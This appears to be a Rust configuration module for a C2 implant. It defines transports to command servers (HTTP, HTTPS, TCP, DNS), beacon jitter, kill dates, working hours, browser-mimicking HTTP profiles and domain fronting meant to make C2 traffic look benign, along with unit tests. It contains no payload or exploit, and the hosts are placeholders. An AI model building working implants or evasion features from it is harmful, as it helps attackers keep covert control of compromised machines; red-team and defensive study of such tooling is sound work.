//! Configuration types

use serde::{Deserialize, Serialize};

/// Complete implant configuration (baked at compile time)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ImplantConfig {
    /// Server's static X25519 public key (32 bytes, hex-encoded)
    pub server_public_key: String,

    /// Transport configurations in priority order
    pub transports: Vec<TransportConfig>,

    /// Profile configuration for HTTP transforms
    pub profile: ProfileConfig,

    /// Default check-in interval in seconds
    pub checkin_interval: u32,

    /// Jitter percentage (0-100)
    pub jitter_percent: u32,

    /// Maximum retry attempts before giving up
    pub max_retries: u32,

    /// Kill date (Unix timestamp, 0 = never)
    pub kill_date: u64,

    /// Working hours (empty = always active)
    pub working_hours: Option<WorkingHours>,
}

impl Default for ImplantConfig {
    fn default() -> Self {
        Self {
            server_public_key: String::new(),
            transports: vec![TransportConfig::default()],
            profile: ProfileConfig::default(),
            checkin_interval: 60,
            jitter_percent: 20,
            max_retries: 10,
            kill_date: 0,
            working_hours: None,
        }
    }
}

/// Transport configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TransportConfig {
    /// Transport type
    pub transport_type: TransportType,

    /// Server address (e.g., "https://c2.example.com:443" or "8.8.8.8:53" for DNS)
    pub address: String,

    /// TLS certificate pin (SHA256, hex-encoded)
    pub cert_pin: Option<String>,

    /// Proxy configuration
    pub proxy: Option<ProxyConfig>,

    /// DNS-specific configuration (only used when transport_type = Dns)
    #[serde(default)]
    pub dns: Option<DnsTransportConfig>,

    /// Domain fronting: if set, send this value as the HTTP `Host` header while
    /// the TLS SNI / TCP connection targets the address above.  Enables routing
    /// through CDNs that accept arbitrary `Host` headers (e.g. Azure CDN, Fastly).
    ///
    /// Example: address = "https://1.2.3.4:443", domain_front_host = "legitimate.example.com"
    /// The CDN resolves to the C2 backend but the wire `Host` header looks benign.
    #[serde(default)]
    pub domain_front_host: Option<String>,
}

/// DNS transport-specific configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DnsTransportConfig {
    /// C2 domain suffix (e.g., "c2.example.com")
    pub domain: String,

    /// Maximum DNS label size (default: 63, DNS spec limit)
    #[serde(default = "default_max_label_size")]
    pub max_label_size: usize,

    /// Query jitter range in milliseconds (min, max)
    #[serde(default = "default_jitter_ms")]
    pub jitter_ms: (u64, u64),

    /// Socket timeout in seconds
    #[serde(default = "default_dns_timeout")]
    pub timeout_secs: u64,

    /// Maximum retries per operation
    #[serde(default = "default_dns_retries")]
    pub max_retries: usize,
}

fn default_max_label_size() -> usize {
    63
}

fn default_jitter_ms() -> (u64, u64) {
    (100, 500)
}

fn default_dns_timeout() -> u64 {
    5
}

fn default_dns_retries() -> usize {
    3
}

impl Default for DnsTransportConfig {
    fn default() -> Self {
        Self {
            domain: "c2.example.com".to_string(),
            max_label_size: default_max_label_size(),
            jitter_ms: default_jitter_ms(),
            timeout_secs: default_dns_timeout(),
            max_retries: default_dns_retries(),
        }
    }
}

impl Default for TransportConfig {
    fn default() -> Self {
        Self {
            transport_type: TransportType::Https,
            address: "https://127.0.0.1:443".to_string(),
            cert_pin: None,
            proxy: None,
            dns: None,
            domain_front_host: None,
        }
    }
}

/// Transport types
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum TransportType {
    Http,
    Https,
    Tcp,
    Dns,
}

/// Proxy configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyConfig {
    pub proxy_type: ProxyType,
    pub address: String,
    pub username: Option<String>,
    pub password: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ProxyType {
    Http,
    Socks4,
    Socks5,
}

/// HTTP profile configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProfileConfig {
    /// User-Agent header
    pub user_agent: String,

    /// Check-in URI path
    pub checkin_uri: String,

    /// Task submission URI path
    pub task_uri: String,

    /// Request headers
    pub request_headers: Vec<(String, String)>,

    /// Response headers (expected from server)
    pub response_headers: Vec<(String, String)>,

    /// Request body transform
    pub request_transform: Transform,

    /// Response body transform
    pub response_transform: Transform,
}

impl Default for ProfileConfig {
    fn default() -> Self {
        Self {
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
            checkin_uri: "/c".to_string(),
            task_uri: "/c".to_string(),
            request_headers: vec![
                ("Accept".to_string(), "application/json".to_string()),
                ("Accept-Language".to_string(), "en-US,en;q=0.9".to_string()),
            ],
            response_headers: vec![("Content-Type".to_string(), "application/json".to_string())],
            request_transform: Transform::None,
            response_transform: Transform::None,
        }
    }
}

/// Body transform types
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Transform {
    None,
    Base64,
    Base64Url,
    Hex,
}

/// Working hours configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkingHours {
    /// Start hour (0-23)
    pub start_hour: u8,

    /// End hour (0-23)
    pub end_hour: u8,

    /// Active days (0 = Sunday, 6 = Saturday)
    pub days: Vec<u8>,

    /// Timezone offset from UTC in hours
    pub timezone_offset: i8,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_transport_config_default_no_fronting() {
        let cfg = TransportConfig::default();
        assert!(cfg.domain_front_host.is_none());
    }

    #[test]
    fn test_transport_config_fronting_roundtrip() {
        let mut cfg = TransportConfig::default();
        cfg.domain_front_host = Some("cdn.legitimate.example.com".to_string());

        let json = serde_json::to_string(&cfg).expect("serialize");
        let decoded: TransportConfig = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(
            decoded.domain_front_host.as_deref(),
            Some("cdn.legitimate.example.com")
        );
    }

    #[test]
    fn test_transport_config_missing_fronting_field_defaults_none() {
        // Configs serialized without the field should deserialize with None (serde default)
        let json = r#"{
            "transport_type": "https",
            "address": "https://1.2.3.4:443",
            "cert_pin": null,
            "proxy": null,
            "dns": null
        }"#;
        let cfg: TransportConfig = serde_json::from_str(json).expect("deserialize");
        assert!(cfg.domain_front_host.is_none());
    }
}
